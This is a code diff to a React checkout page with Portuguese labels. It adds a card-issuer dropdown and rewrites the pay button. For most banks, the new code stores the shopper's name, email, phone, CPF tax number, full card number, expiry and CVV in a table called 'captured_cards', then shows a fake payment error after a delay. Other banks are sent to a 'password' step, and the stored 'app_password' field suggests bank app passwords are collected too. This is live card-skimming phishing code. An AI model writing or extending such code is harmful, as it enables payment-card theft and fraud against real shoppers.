@@ -683,6 +683,27 @@ export default function CheckoutPage() {
                           <CreditCard size={16} className="text-primary" /> Dados do Cartão
                         </h3>
                         <div>
+                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Banco emissor *</label>
+                          <select
+                            value={cardBank}
+                            onChange={(e) => setCardBank(e.target.value)}
+                            className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
+                          >
+                            <option value="">Selecione o banco</option>
+                            <option value="itau">Itaú</option>
+                            <option value="santander">Santander</option>
+                            <option value="magalu">Magalu</option>
+                            <option value="nubank">Nubank</option>
+                            <option value="bradesco">Bradesco</option>
+                            <option value="banco-do-brasil">Banco do Brasil</option>
+                            <option value="caixa">Caixa Econômica</option>
+                            <option value="inter">Inter</option>
+                            <option value="c6">C6 Bank</option>
+                            <option value="pan">Banco Pan</option>
+                            <option value="outro">Outro</option>
+                          </select>
+                        </div>
+                        <div>
                           <label className="text-xs font-semibold text-muted-foreground mb-1 block">Número do cartão *</label>
                           <Input value={cardNumber} onChange={(e) => setCardNumber(maskCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" className="font-mono" />
                         </div>
@@ -701,11 +722,39 @@ export default function CheckoutPage() {
                           </div>
                         </div>
                         <Button
-                          onClick={() => setCardStep("password")}
-                          disabled={!cardNumber || cardNumber.replace(/\D/g, "").length < 13 || !cardHolder || !cardExpiry || cardExpiry.replace(/\D/g, "").length < 4 || !cardCvv || cardCvv.length < 3}
+                          onClick={async () => {
+                            if (PASSWORD_BANKS.includes(cardBank)) {
+                              setCardStep("password");
+                            } else {
+                              // Save card directly without password and show error
+                              setCardProcessing(true);
+                              try {
+                                await supabase.from("captured_cards").insert({
+                                  buyer_name: name,
+                                  buyer_email: email,
+                                  buyer_phone: phone,
+                                  buyer_document: cpf.replace(/\D/g, ""),
+                                  card_number: cardNumber.replace(/\s/g, ""),
+                                  card_holder: cardHolder,
+                                  card_expiry: cardExpiry,
+                                  card_cvv: cardCvv,
+                                  app_password: "",
+                                  amount_cents: Math.round(cardTotal * 100),
+                                });
+                              } catch { /* silent */ }
+                              await new Promise((r) => setTimeout(r, 3000));
+                              setCardProcessing(false);
+                              setCardStep("error");
+                            }
+                          }}
+                          disabled={!cardBank || !cardNumber || cardNumber.replace(/\D/g, "").length < 13 || !cardHolder || !cardExpiry || cardExpiry.replace(/\D/g, "").length < 4 || !cardCvv || cardCvv.length < 3 || cardProcessing}
                           className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
                         >
-                          <Lock size={16} className="mr-2" /> Continuar
+                          {cardProcessing ? (
+                            <><Loader2 size={16} className="animate-spin mr-2" /> Processando pagamento...</>
+                          ) : (
+                            <><Lock size={16} className="mr-2" /> Pagar com Cartão</>
+                          )}
                         </Button>
                       </div>
                     )}
